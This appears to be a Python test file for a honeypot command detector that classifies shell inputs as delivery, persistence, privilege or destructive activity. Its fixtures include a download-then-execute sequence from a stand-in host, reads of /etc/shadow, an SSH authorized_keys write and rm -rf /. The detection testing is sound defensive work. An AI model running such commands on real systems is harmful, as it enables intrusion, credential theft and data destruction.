"""Detector regression tests: command syntax, not malicious intent."""
from __future__ import annotations

import json
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

from honeytrace.analyzer import analyze_events
from honeytrace.detection import RULE_IDS, command_indicators
from honeytrace.rule_benchmark import SAMPLE_CASES, benchmark_rules, load_cases


def events_for(commands):
    return [dict(session="fixture", sensor="lab", src_ip="192.0.2.1", timestamp="2026-10-01T12:00:00Z",
                 eventid="cowrie.command.input", input=c) for c in commands]


class DetectorTests(unittest.TestCase):
    def test_quoted_examples_do_not_trigger(self):
        for command in ('echo "wget https://example.invalid"', "grep -n 'rm -rf' notes.txt",
                        "echo 'cat /etc/shadow'", "logger 'curl https://example.invalid'",
                        "echo 'authorized_keys' > /tmp/note"):
            with self.subTest(command=command):
                self.assertEqual(command_indicators(command), frozenset())

    def test_retrieval_wrappers_and_shell_c(self):
        for command in ("sudo -u root wget https://example.invalid/a", "busybox wget https://example.invalid/a",
                        "env FOO=bar curl https://example.invalid/a", "sh -c 'wget https://example.invalid/a'"):
            with self.subTest(command=command):
                self.assertIn("delivery", command_indicators(command))

    def test_shell_c_is_explicitly_unwrapped_not_echo(self):
        self.assertEqual(command_indicators('echo "bash -c wget https://example.invalid"'), frozenset())
        self.assertEqual(command_indicators("sh -c 'echo wget'"), frozenset({"obfuscated"}))

    def test_comments_and_help_are_not_payload_delivery(self):
        self.assertNotIn("delivery", command_indicators("echo hello # wget https://example.invalid"))
        self.assertNotIn("delivery", command_indicators("curl --help"))
        self.assertNotIn("delivery", command_indicators("wget --version"))

    def test_read_only_crontab_is_recon_not_persistence(self):
        self.assertEqual(command_indicators("crontab -l"), frozenset({"recon"}))
        self.assertEqual(command_indicators("crontab -e"), frozenset({"persistence"}))

    def test_authorized_keys_write_requires_ssh_path(self):
        self.assertEqual(command_indicators("echo key >> /root/.ssh/authorized_keys"), frozenset({"persistence"}))
        self.assertEqual(command_indicators("echo key > /tmp/authorized_keys"), frozenset())

    def test_privilege_and_destruction(self):
        self.assertEqual(command_indicators("sudo -l"), frozenset({"privilege"}))
        self.assertIn("privilege", command_indicators("sudo cat /etc/shadow"))
        self.assertIn("destructive", command_indicators("rm -r -f /tmp/test"))
        self.assertIn("destructive", command_indicators("rm --recursive --force /tmp/test"))

    def test_malformed_quotes_are_non_executable_and_unmatched(self):
        self.assertEqual(command_indicators("echo 'unterminated curl"), frozenset())

    def test_session_pattern_uses_both_retrieval_and_execution(self):
        report = analyze_events(events_for(["wget https://example.invalid/drop", "chmod +x /tmp/drop", "./drop"]), enable_ml=False)
        row = report["sessions"][0]
        self.assertIn("Retrieval-and-execution pattern", row["labels"])
        self.assertIn(RULE_IDS["execution"], row["rule_ids"])
        self.assertIn(RULE_IDS["delivery"], row["rule_ids"])
        self.assertEqual(report["meta"]["rule_engine_version"], "1.1")

    def test_echo_does_not_trigger_risk(self):
        report = analyze_events(events_for(["echo 'wget https://example.invalid/drop; rm -rf /'", "echo hello"]), enable_ml=False)
        row = report["sessions"][0]
        self.assertEqual(row["risk"], 0)
        self.assertEqual(row["labels"], ["Unclassified interaction"])

    def test_benchmark_fixture_is_syntax_only(self):
        result = benchmark_rules(SAMPLE_CASES)
        self.assertEqual(result["cases"], 30)
        self.assertEqual(result["exact_match_rate"], 1)
        self.assertNotIn("wget https://", json.dumps(result))
        self.assertIn("not verified attack", result["limitations"])

    def test_custom_cases_and_undefined_precision(self):
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "cases.jsonl"
            p.write_text(json.dumps({"command": "echo hello", "expected": []}) + "\n", encoding="utf-8")
            result = benchmark_rules(load_cases(p), origin="analyst-supplied")
            self.assertIsNone(result["micro"]["precision"])
            self.assertEqual(result["case_origin"], "analyst-supplied")

    def test_rejects_invalid_and_unknown_categories(self):
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "cases.jsonl"
            p.write_text(json.dumps({"command": "test", "expected": ["verified-malicious"]}), encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "invalid or duplicate"):
                load_cases(p)
            p.write_text("{", encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "invalid JSON"):
                load_cases(p)

    def test_cli_aggregate_report_refuses_overwrite_and_redacts(self):
        root = Path(__file__).resolve().parents[1]
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "cases.jsonl"
            dest = Path(td) / "report.json"
            secret = "TOP_PRIVATE_SECRET"
            p.write_text(json.dumps({"command": f"echo {secret}", "expected": []}) + "\n", encoding="utf-8")
            args = [sys.executable, str(root / "honeytrace.py"), "rules-benchmark", str(p), "--output", str(dest)]
            first = subprocess.run(args, cwd=root, capture_output=True, text=True)
            self.assertEqual(first.returncode, 0, first.stderr)
            self.assertNotIn(secret, dest.read_text(encoding="utf-8"))
            again = subprocess.run(args, cwd=root, capture_output=True, text=True)
            self.assertNotEqual(again.returncode, 0)
            self.assertIn("File exists", again.stderr)


if __name__ == "__main__":
    unittest.main()
